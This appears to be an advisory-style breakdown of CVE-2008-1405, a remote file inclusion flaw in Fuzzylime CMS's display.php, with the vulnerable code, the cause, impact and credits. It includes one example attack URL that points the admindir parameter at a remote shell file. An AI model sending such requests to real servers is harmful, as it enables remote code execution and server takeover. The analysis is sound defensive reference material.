Based on the provided content, here's a breakdown of the vulnerability:

**CVE ID:** CVE-2008-1405

**Vulnerability:** Remote File Inclusion (RFI)

**Affected Software:** Fuzzylime CMS version 3.01 and prior.

**Root Cause:** The `display.php` script in Fuzzylime CMS does not properly sanitize the `admindir` parameter before including a file, leading to a remote file inclusion vulnerability. Specifically, the `$admindir` variable is derived from the GET parameter of the same name.

**Vulnerable Code Snippet (from exploit-db.com):**

```php
  /code/display.php:
  ...
1    <?
2    $s = $_GET[s];
3    $p = $_GET[p];
4    $s = str_replace("../", "", $s);
5    $p = str_replace("../", "", $p);
6    if(empty($s)) $s = "front";
7    if(empty($p)) $p = "index";
8    $curs = $s;
9    $curp = $p;
10
11   include "code/settings.inc.php";
12   include "${admindir}/languages/english.inc.php";
 ...
```

*   **Line 11:** The script attempts to include `code/settings.inc.php`. If this file doesn't exist, `$admindir` remains empty, but the code proceeds to line 12.
*   **Line 12:** The script includes a file path constructed using the attacker-controlled `$admindir` parameter, leading to the RFI vulnerability. The code does not validate or sanitize the `$admindir` parameter, allowing for arbitrary file inclusion.

**Weaknesses:**

*   **Lack of Input Validation:** The script does not properly validate or sanitize the `admindir` parameter before including it in the path, allowing an attacker to specify a remote file.
*   **Uninitialized Variable:** When `code/settings.inc.php` is missing, `$admindir` is empty, and the code doesn't handle it.

**Attack Vector:**

*   The attacker sends a crafted HTTP GET request to `display.php` that includes a malicious URL in the `admindir` parameter.
    * Example: `http://[HOST]/[PATH]/code/display.php?admindir=http://host/shell.txt?`

**Required Attacker Capabilities/Position:**

*   The attacker needs to be able to send HTTP requests to the vulnerable Fuzzylime CMS installation.
*   The attacker needs access to a remote server hosting the malicious file that they intend to include.

**Impact of Exploitation:**

*   **Remote Code Execution:** By including a malicious PHP file, an attacker can execute arbitrary code on the server running the vulnerable Fuzzylime CMS. This can lead to full compromise of the server, data theft, and other malicious activities.
*   **Data Exposure:** The attacker may also include files from within the server if they leverage Local File Inclusion methods using the same vulnerability.

**Additional Information:**

*   The vulnerability was discovered and reported by "irk4z".
*   The exploit was originally published on milw0rm.com
*   The exploit was assigned EDB-ID: 5260 on exploit-db.com
